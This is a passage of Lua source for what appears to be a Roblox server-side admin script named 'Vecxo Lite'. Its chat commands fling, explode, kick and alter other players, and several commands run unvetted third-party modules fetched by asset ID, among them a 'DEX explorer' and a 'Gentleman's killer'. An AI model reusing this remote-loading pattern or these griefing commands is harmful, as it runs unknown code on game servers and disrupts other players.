					cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
				end
			end
			function givepants(v, id)
				if v and v.Character then
					for i, c in pairs(v.Character:GetChildren()) do
						if c:IsA("Pants") then
							c:Destroy()
						end
					end
					local cl = Instance.new("Pants", v.Character)
					cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
				end
			end
			for i,v in plr.Character:GetChildren() do
				if v:IsA("Accessory") then
					v:Destroy()
				end
			end
			local function addDoubleStarRingAura(character)
				local hrp = character:FindFirstChild("HumanoidRootPart")
				if not hrp then return end
				local function createRing(offsetY, spinDir)
					local ring = Instance.new("Part")
					ring.Size = Vector3.new(6, 0.2, 6)
					ring.Anchored = true
					ring.CanCollide = false
					ring.Transparency = 0.3
					ring.Color = Color3.fromRGB(255, 215, 0)
					ring.Material = Enum.Material.Neon
					ring.Shape = Enum.PartType.Cylinder
					ring.Parent = workspace
					local sparkles = Instance.new("ParticleEmitter")
					sparkles.Texture = "rbxassetid://243660364"
					sparkles.Rate = 20
					sparkles.Lifetime = NumberRange.new(1)
					sparkles.Speed = NumberRange.new(0.5)
					sparkles.Rotation = NumberRange.new(0, 360)
					sparkles.RotSpeed = NumberRange.new(-10, 10)
					sparkles.Size = NumberSequence.new(0.5)
					sparkles.Color = ColorSequence.new(Color3.fromRGB(255, 215, 0))
					sparkles.Parent = ring
					return ring, offsetY, spinDir
				end
				local ring1, offset1, dir1 = createRing(-2, 1)  
				local ring2, offset2, dir2 = createRing(1.5, -1)
				local spinSpeed = 90 
				local duration = 5 
				local startTime = tick()
				game:GetService("RunService").Heartbeat:Connect(function()
					if not ring1.Parent or not ring2.Parent then return end
					if tick() - startTime > duration then
						ring1:Destroy()
						ring2:Destroy()
						return
					end
					local t = tick() - startTime
					ring1.CFrame = hrp.CFrame * CFrame.new(0, offset1, 0) * CFrame.Angles(math.rad(90), math.rad(t * spinSpeed * dir1), 0)
					ring2.CFrame = hrp.CFrame * CFrame.new(0, offset2, 0) * CFrame.Angles(math.rad(90), math.rad(t * spinSpeed * dir2), 0)
				end)
			end
			addDoubleStarRingAura(plr.Character)
			givehat(plr, 12101418657)
			givehat(plr, 18367644870)
			givehat(plr, 8107902065)
			givehat(plr, 6133262085)
			giveshirt(plr, 159269845)
			givepants(plr, 159269873)
		end
	elseif cmd == "!fire" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Really red", 2) end)
			local char = plr.Character
			if char then
				local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
				if hrp and not hrp:FindFirstChild("Fire") then
					Instance.new("Fire", hrp)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully fired " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))

	elseif cmd == "!unfire" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Really red", 2) end)
			local char = plr.Character
			if char then
				for _, v in ipairs(char:GetDescendants()) do
					if v:IsA("Fire") then v:Destroy() end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully unfired " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))

	elseif cmd == "!sparkles" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright blue", 2) end)
			local char = plr.Character
			if char then
				local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
				if hrp and not hrp:FindFirstChild("Sparkles") then
					Instance.new("Sparkles", hrp)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully sparkled " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!unsparkles" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright blue", 2) end)
			local char = plr.Character
			if char then
				for _, v in ipairs(char:GetDescendants()) do
					if v:IsA("Sparkles") then v:Destroy() end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully unsparkled " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))

	elseif cmd == "!ff" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "White", 2) end)
			local char = plr.Character
			if char and not char:FindFirstChildOfClass("ForceField") then
				Instance.new("ForceField", char)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully forcefielded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))

	elseif cmd == "!unff" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "White", 2) end)
			local char = plr.Character
			if char then
				for _, v in ipairs(char:GetChildren()) do
					if v:IsA("ForceField") then v:Destroy() end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully removed forcefield from " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!bighead" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright yellow", 2) end)
			local char = plr.Character
			if char and char:FindFirstChild("Head") then
				char.Head.Size = Vector3.new(5, 5, 5)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully bigheaded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!jumppower" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local value = tonumber(args[3]) or 50
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright violet", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").UseJumpPower = true
				char:FindFirstChildOfClass("Humanoid").JumpPower = value
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully set JumpPower to " .. value .. " for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!respawn" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No valid target players found.")
			return
		end

		for _, plr in ipairs(targets) do
			if plr.Character then
				plr:LoadCharacter()
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Respawned " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!god" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").MaxHealth = math.huge
				char:FindFirstChildOfClass("Humanoid").Health = math.huge
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully godded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!ungod" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local char = plr.Character
			if char then
				char:FindFirstChildOfClass("Humanoid").MaxHealth = 100
				char:FindFirstChildOfClass("Humanoid").Health = 100
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully ungodded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!health" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local value = tonumber(args[3]) or 100
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright green", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").MaxHealth = value
				char:FindFirstChildOfClass("Humanoid").Health = value
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully set health to " .. value .. " for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!speed" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local value = tonumber(args[3]) or 16
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright violet", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").WalkSpeed = value
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully set WalkSpeed to " .. value .. " for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!minihead" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright yellow", 2) end)
			local char = plr.Character
			if char and char:FindFirstChild("Head") then
				char.Head.Size = Vector3.new(0.5, 0.5, 0.5)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully miniheaded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!invisible" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Really black", 2) end)
			local char = plr.Character
			if char then
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
						part.Transparency = 1
					end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully turned invisible " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!visible" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Really black", 2) end)
			local char = plr.Character
			if char then
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Transparency = 0
					end
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully turned visible " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!sit" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright orange", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").Sit = true
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully sat " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!jump" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright orange", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").Jump = true
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully made jump " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!trip" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Bright orange", 2)
			end)
			local char = plr.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				local hrp = char:FindFirstChild("HumanoidRootPart")
				local currentCF = hrp.CFrame
				hrp.CFrame = currentCF * CFrame.Angles(math.rad(180), 0, 0)
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then
					hum:ChangeState(Enum.HumanoidStateType.Physics)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully tripped " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!stun" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright orange", 2) end)
			local char = plr.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").PlatformStand = true
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully stunned " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!fling" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright violet", 2) end)
			local char = plr.Character
			if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChildOfClass("Humanoid") then
				local hrp = char.HumanoidRootPart
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				local bv = Instance.new("BodyVelocity")
				bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				bv.Velocity = Vector3.new(
					math.random(-200, 2000),
					math.random(300, 5000),
					math.random(-200, 2000)
				)
				bv.Parent = hrp
				game:GetService("Debris"):AddItem(bv, 0.5)
				humanoid.PlatformStand = false
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully flinged " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!explode" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright red", 2) end)
			local char = plr.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				local explosion = Instance.new("Explosion")
				explosion.Position = char.HumanoidRootPart.Position
				explosion.BlastRadius = 10
				explosion.BlastPressure = 500000
				explosion.Parent = workspace
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully exploded " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!smite" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright red", 2) end)
			local char = plr.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				Lightning(plr.Character.HumanoidRootPart.Position+Vector3.new(0,50,0),plr.Character.HumanoidRootPart.Position,3,math.random(-2.5,2.5),"New Yeller",.4,.4)
				local explosion = Instance.new("Explosion")
				explosion.Position = char.HumanoidRootPart.Position
				explosion.BlastRadius = 10
				explosion.BlastPressure = 500000
				explosion.Parent = workspace
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully smited " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!resize" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local scale = tonumber(args[3]) or 1
		for _, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Bright violet", 2)
			end)
			local char = plr.Character
			if char and char:FindFirstChild("HumanoidRootPart") then
				local parts = {
					"Head",
					"Torso",
					"Left Arm",
					"Right Arm",
					"Left Leg",
					"Right Leg"
				}
				for _, name in ipairs(parts) do
					local part = char:FindFirstChild(name)
					if part then
						part.Size = part.Size * scale
						for _, acc in ipairs(part:GetChildren()) do
							if acc:IsA("SpecialMesh") then
								acc.Scale = acc.Scale * scale
							end
						end
					end
				end
				for _, obj in ipairs(char:GetDescendants()) do
					if obj:IsA("Motor6D") then
						obj.C0 = obj.C0 * CFrame.new(0,0,0):Inverse()
						obj.C0 = obj.C0 + (obj.C0.Position * (scale - 1))
					end
				end
				char.HumanoidRootPart.Size = char.HumanoidRootPart.Size * scale
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ","‚úÖ Successfully resized to " .. scale .. "x for " ..(#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!headsize" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local scale = tonumber(args[3])
		if not scale then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Please provide a valid scale number.")
			return
		end
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char and char:FindFirstChild("Head") then
					char.Head.Size = Vector3.new(scale, scale, scale)
					char.Head.Massless = true -- optional, prevents physics issues
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Headsize set to " .. scale .. " for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!rainbowify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							task.spawn(function()
								while part.Parent do
									for i, color in ipairs({Color3.fromRGB(255,0,0), Color3.fromRGB(255,127,0), Color3.fromRGB(255,255,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(75,0,130), Color3.fromRGB(148,0,211)}) do
										part.Color = color
										task.wait(0.1)
									end
								end
							end)
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Rainbowify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!flashify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							task.spawn(function()
								while part.Parent do
									part.Color = Color3.fromRGB(255,255,255)
									task.wait(0.1)
									part.Color = Color3.fromRGB(0,0,0)
									task.wait(0.1)
								end
							end)
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Flashify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!goldify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							part.Color = Color3.fromRGB(255,215,0)
							part.Material = Enum.Material.Metal
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Goldify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!shinify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							part.Reflectance = 0.9
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Shinify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!silverify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							part.Color = Color3.fromRGB(192,192,192)
							part.Material = Enum.Material.Metal
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Silverify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!neonify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local col = args[3] and BrickColor.new(args[3]).Color or Color3.fromRGB(0, 255, 255)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							part.Color = col
							part.Material = Enum.Material.Neon
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Neonify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!glowify" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			task.spawn(function()
				local char = plr.Character
				if char then
					for _, part in ipairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							local light = Instance.new("PointLight")
							light.Color = part.Color
							light.Brightness = 2
							light.Range = 10
							light.Parent = part
						end
					end
				end
			end)
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Glowify applied to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!char" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local username = args[3]
		if not username then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Please provide a username to morph into")
			return
		end
		local success, userId = pcall(function()
			return Players:GetUserIdFromNameAsync(username)
		end)
		if not success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Could not find user '" .. username .. "'")
			return
		end
		for _, plr in ipairs(targets) do
			task.spawn(function() GraphicalEffects.CrystalRing(plr, "Bright violet", 2) end)
			local oldPos = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.HumanoidRootPart.Position
			plr.CharacterAppearanceId = userId
			plr:LoadCharacter()
			if oldPos then
				local char = plr.Character
				if char then
					local hrp = char:WaitForChild("HumanoidRootPart")
					hrp.CFrame = CFrame.new(oldPos)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully morphed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players") .. " into " .. username)
	elseif cmd == "!unchar" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			local oldPos = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.HumanoidRootPart.Position
			plr.CharacterAppearanceId = plr.UserId
			plr:LoadCharacter()
			if oldPos then
				local char = plr.Character
				if char then
					local hrp = char:WaitForChild("HumanoidRootPart")
					hrp.CFrame = CFrame.new(oldPos)
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Successfully reverted " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players") .. " to their original character")
	elseif cmd == "!unstartergear" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if plr:FindFirstChild("StarterGear") then
				for _, tool in pairs(plr.StarterGear:GetChildren()) do
					tool:Destroy()
				end
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ StarterGear cleared for " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!startergear" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		local arg = table.concat(args, " ", 3)
		local tool
		if arg == "" then
			if sender.Character then
				tool = sender.Character:FindFirstChildOfClass("Tool") or sender.Backpack:FindFirstChildOfClass("Tool")
				if tool then
					tool = tool:Clone()
				else
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No tool found in your character or backpack!")
					return
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå You don't have a character!")
				return
			end
		else
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(tonumber(arg))
			end)
			if success and gear then
				tool = gear:FindFirstChildOfClass("Tool")
				if not tool then
					notifyv3(sender, "[Vecxo Lite]: ", "‚ùå No tool found in asset with ID: "..arg)
					return
				end
			else
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Invalid gear ID!")
				return
			end
		end
		for _, plr in ipairs(targets) do
			if plr:FindFirstChild("StarterGear") then
				local backpackTool = tool:Clone()
				backpackTool.Parent = plr.Backpack
				tool.Parent = plr.StarterGear
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ StarterGear given to " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!exit" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for _, plr in ipairs(targets) do
			if plr.Name == "Reloxz" and sender.Name ~= "Reloxz" then
				notify(sender, "[Vecxo Lite]: ", "‚ùå You cannot use !exit on the script developer!")
				return
			end
			local s = Instance.new("Sound", plr.Character)
			s.SoundId = "rbxassetid://1289263994"
			s.Volume = 10
			s:Play()
			for _, v in pairs(plr.Character:GetChildren()) do
				if v:IsA("Accessory") then
					local currentcf = v.Handle.CFrame
					v:Clone().Parent = workspace
					v.Handle.CFrame = currentcf
				end
			end
			for _, limb in pairs(plr.Character:GetChildren()) do
				if limb:IsA("BasePart") then
					limb:Destroy()
				end
			end

			plr:Kick("[Vecxo Lite]: You have exited the server.")
		end
	elseif cmd == "!gmod" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(2136443074)
			end)
			if not table.find(gmodded, plr.UserId) then
				table.insert(gmodded, plr.UserId)
			end
			if success and gear then
				local gmod = gear:FindFirstChildOfClass("Tool")
				if gmod then
					gmod.Parent = plr.Backpack
				end
				gmod:WaitForChild("RemoteScript"):Destroy()
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("RemoteScript"):Clone().Parent = gmod
				if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's gmod remote") then
					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
					gmodremote.Name = "cxo's gmod remote"
				end
				gcon[plr.UserId] = gmod:WaitForChild("RemoteScript").Destroying:Connect(function()
					gcon[plr.UserId]:Disconnect()
				end)
			end
		end
	elseif cmd == "!ogmap" then
		handled = true
		task.spawn(function()
			GraphicalEffects.CrystalRing(sender, "Lime green", 2)
		end)
		local success, err = pcall(function()
			require(79975359259173):load()
		end)
		if not success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error loading 2013 KAH map - " .. err)
		end
		notify(sender, "[Vecxo Lite]:", "‚úÖ Successfully loaded in 2013 KAH map")
	elseif cmd == "!antiskid" then
		handled = true
		task.spawn(function()
			GraphicalEffects.CrystalRing(sender, "Lime green", 2)
		end)
		local success, err = pcall(function()
			require(16534611190).AntiSkid()
		end)
		if not success then
			notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error loading Anti skid - " .. err)
		end
		notify(sender, "[Vecxo Lite]:", "‚úÖ Successfully loaded Anti Skid")
	elseif cmd == "!dex" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(12146718110):Fire(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running DEX explorer on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Ran DEX explorer on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cannon" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(6802356973).load(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Cannon gun on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Cannon gun ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	--[[elseif cmd == "!hang2" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(03150276424):Fire(plr.Name,'i baked you a pie')
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Hang V2 on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Hang V2 ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))]]
	elseif cmd == "!gentk" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(5430831931).Dark(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Gentleman's killer on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Gentleman's killer ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!stampertools" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(17015419876)(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Stamper tools on " .. plr.Name .. " - " .. err)
			end
		end
		notifyv3(sender, "[Vecxo Lite]: ", "‚úÖ Stamper tools ran on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!wormhole" then
		handled = true
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			task.spawn(function()
				GraphicalEffects.CrystalRing(plr, "Lime green", 2)
			end)
			local success, err = pcall(function()
				require(15877665199).give(plr.Name)
			end)
			if not success then
				notifyv3(sender, "[Vecxo Lite]: ", "‚ùå Error running Worm hole device on " .. plr.Name .. " - " .. err)
			end
		end
